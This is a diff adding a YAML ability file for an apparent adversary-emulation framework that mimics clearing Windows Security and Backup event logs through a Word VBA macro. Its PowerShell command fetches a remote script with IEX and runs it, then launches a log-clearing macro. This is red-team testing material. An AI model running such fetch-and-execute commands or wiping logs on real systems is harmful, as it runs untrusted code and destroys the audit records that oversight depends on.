@@ -1,0 +1,22 @@
+---
+- id: ab9d70345f10c10d91f6761e4224e54a
+  name: Clear Event Logs via VBA
+  description: "This module utilizes WMI via VBA to clear the Security and Backup\
+    \ eventlogs from the system. \n\nElevation is required for this module to execute\
+    \ properly, otherwise WINWORD will throw an \"Access Denied\" error\n"
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.005
+    name: 'Disable or Modify Tools: Clear Windows Event Logs'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1685.005\src\T1685.005-macrocode.txt"
+          -officeProduct "Word" -sub "ClearLogs"'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
